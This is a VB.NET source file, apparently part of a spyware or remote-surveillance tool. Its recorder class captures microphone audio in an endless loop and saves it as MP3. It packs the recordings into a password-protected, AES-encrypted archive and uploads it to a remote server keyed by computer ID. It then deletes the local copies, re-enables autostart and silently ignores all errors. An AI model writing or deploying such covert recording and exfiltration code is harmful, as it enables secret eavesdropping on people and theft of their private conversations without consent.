#Region "References"

Imports System.IO
Imports System.Net
Imports System.Text
Imports System.Threading

Imports Ionic.Zip
Imports NAudio.Lame
Imports NAudio.Utils
Imports NAudio.Wave

#End Region

Friend Class AudioInputRecorder
    Implements IDisposable

#Region "Private Members"

    Private ReadOnly _wavSource As WaveInEvent

    Private _wavFileWriter As WaveFileWriter
    Private _wavMemoryStream As MemoryStream

    Private ReadOnly _inputDevIndex As Integer

    Private _recordDuration As Long
    Private Shared _zipFileIndex As Long

    Private Const MAX_VALUE As Single = 32767
    Private Const BYTES_PER_SAMPLE As Integer = 4

#End Region

#Region "Constructor"

    Public Sub New(inputDevIndex As Integer)

        _inputDevIndex = inputDevIndex

        _wavSource = New WaveInEvent With {
                .DeviceNumber = inputDevIndex,
                .WaveFormat = New WaveFormat(32000, WaveIn.GetCapabilities(_inputDevIndex).Channels)
            }

        AddHandler _wavSource.DataAvailable, AddressOf DataAvailableHandler
        AddHandler _wavSource.RecordingStopped, AddressOf RecordingStoppedHandler

    End Sub

#End Region

#Region "Public Methods"

    Public Sub StartRecording()

        _wavMemoryStream = New MemoryStream
        _wavFileWriter = New WaveFileWriter(New IgnoreDisposeStream(_wavMemoryStream), _wavSource.WaveFormat)

        _wavSource.StartRecording()
        _recordDuration = AUDIO_RECORD_DURATION

        While _recordDuration > 0

            Thread.Sleep(500)
            _recordDuration -= 500

        End While

        _wavSource.StopRecording()

    End Sub

    Public Sub StopRecording()

        If _wavSource IsNot Nothing Then
            _wavSource.StopRecording()
        End If

    End Sub

#End Region

#Region "Event Handlers"

    Private Sub DataAvailableHandler(sender As Object, e As WaveInEventArgs)

        If _wavFileWriter IsNot Nothing Then

            Dim peakL As Integer = 0
            Dim peakR As Integer = 0
            Dim index As Integer = 0

            While index < e.BytesRecorded

                Dim valueL As Integer = BitConverter.ToInt16(e.Buffer, index)
                peakL = Math.Max(peakL, valueL)

                Dim valueR As Integer = BitConverter.ToInt16(e.Buffer, index + 2)
                peakR = Math.Max(peakR, valueR)

                index += BYTES_PER_SAMPLE

            End While

            If CInt((peakL / MAX_VALUE) * 100) >= 15 AndAlso CInt((peakR / MAX_VALUE) * 100) >= 15 Then 'Only record the input audio when it reaches a specific threshold
                _wavFileWriter.Write(e.Buffer, 0, e.BytesRecorded)
                _wavFileWriter.Flush()
            End If

        End If

    End Sub

    Private Sub RecordingStoppedHandler(s As Object, e As StoppedEventArgs)

        If Not IsAppExit Then

            ConvertWavToMp3()

            DisposeStreams()

            ArchiveRecord()
            StartRecording()

        Else

            DisposeStreams()
            _wavSource.Dispose()

        End If

    End Sub

    Private Sub FileUploadCompleted(sender As Object, e As UploadFileCompletedEventArgs)

        Dim wc = CType(sender, WebClient)

        For Each f In wc.Headers.GetValues("File-Path")

            Try
                File.Delete(f)
            Catch ex As Exception
                'Do nothing
            End Try

        Next

    End Sub

#End Region

#Region "Helper Methods"

    Private Sub ConvertWavToMp3()

        If _wavMemoryStream.Length >= 1024 Then

            _wavMemoryStream.Position = 0

            Using resultMs = New MemoryStream()

                Using wfr = New WaveFileReader(_wavMemoryStream)

                    Using mfw = New LameMP3FileWriter(resultMs, wfr.WaveFormat, 64)

                        wfr.CopyTo(mfw)
                        mfw.Flush()

                        If Not Directory.Exists(DirAudioInput) Then Directory.CreateDirectory(DirAudioInput)
                        Dim audioFilePath = Path.Combine(DirAudioInput, "audio-input.rmp3")

                        resultMs.Position = 0

                        Using fs As New FileStream(audioFilePath, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.Read)
                            resultMs.CopyTo(fs)
                            fs.Flush()
                        End Using

                    End Using
                End Using

            End Using

        End If

    End Sub

    Private Sub ArchiveRecord()

        Try

            Dim audioFilePath = Path.Combine(DirAudioInput, "audio-input.rmp3")

            If File.Exists(audioFilePath) Then

                Dim fi = New FileInfo(audioFilePath)

                If fi.Length >= 1024 Then

                    _zipFileIndex += 1

                    Dim zipFilePath = Path.Combine(DirRoot, String.Concat("AudioInput-", Date.Now.Year, "-", Date.Now.Month, "-", Date.Now.Day, "-", Date.Now.Hour, "-", Date.Now.Minute, "-", Date.Now.Second, "-", _zipFileIndex, ".rzip"))

                    If File.Exists(zipFilePath) Then File.Delete(zipFilePath) 'Delete the already existing Zip archive

                    Using zip As New ZipFile(zipFilePath, Encoding.UTF8)
                        zip.Password = ZIP_FILE_PASS
                        zip.AddDirectory(DirAudioInput)
                        zip.CompressionMethod = CompressionMethod.Deflate
                        zip.Encryption = EncryptionAlgorithm.WinZipAes256
                        zip.CompressionLevel = Ionic.Zlib.CompressionLevel.BestSpeed
                        zip.Save()
                    End Using

                    UploadRecord(zipFilePath) 'Upload the ZIP file to the remote server

                End If

            End If

        Catch ex As Exception
            'Do nothing

        Finally

            EnableAutoStart()

            If Directory.Exists(DirAudioInput) Then

                For Each f In Directory.GetFiles(DirAudioInput, "*.*", SearchOption.TopDirectoryOnly) 'Delete records

                    Try
                        File.Delete(f)
                    Catch ex As Exception
                        'Do nothing
                    End Try

                Next

            End If

        End Try

    End Sub

    Private Sub UploadRecord(zipFilePath As String)

        Using wc = New WebClientEx()

            wc.UseDefaultCredentials = True

            wc.Headers.Add("Content-Type", "binary/octet-stream")
            wc.Headers.Add("User-Agent", USER_AGENT)
            wc.Headers.Add("File-Path", zipFilePath)

            AddHandler wc.UploadFileCompleted, AddressOf FileUploadCompleted

            'Use your own upload script
            wc.UploadFileAsync(New Uri("https://www.mysite.com/upload.php?computer_id=" & ComputerId), "POST", zipFilePath)

        End Using

    End Sub

    Private Sub DisposeStreams()

        If _wavFileWriter IsNot Nothing Then
            _wavFileWriter.Dispose()
            _wavFileWriter = Nothing
        End If

        If _wavMemoryStream IsNot Nothing Then _wavMemoryStream.Dispose()

    End Sub

#End Region

#Region "IDispose"

    Private disposedValue As Boolean

    Protected Overridable Sub Dispose(disposing As Boolean)
        If Not disposedValue Then
            If disposing Then

                StopRecording()
                DisposeStreams()

                If _wavSource IsNot Nothing Then _wavSource.Dispose()

            End If

            ' free unmanaged resources (unmanaged objects) and override finalizer
            ' set large fields to null
            disposedValue = True
        End If
    End Sub

    ' ' override finalizer only if 'Dispose(disposing As Boolean)' has code to free unmanaged resources
    ' Protected Overrides Sub Finalize()
    '     ' Do not change this code. Put cleanup code in 'Dispose(disposing As Boolean)' method
    '     Dispose(disposing:=False)
    '     MyBase.Finalize()
    ' End Sub

    Public Sub Dispose() Implements IDisposable.Dispose
        ' Do not change this code. Put cleanup code in 'Dispose(disposing As Boolean)' method
        Dispose(disposing:=True)
        GC.SuppressFinalize(Me)
    End Sub

#End Region

End Class
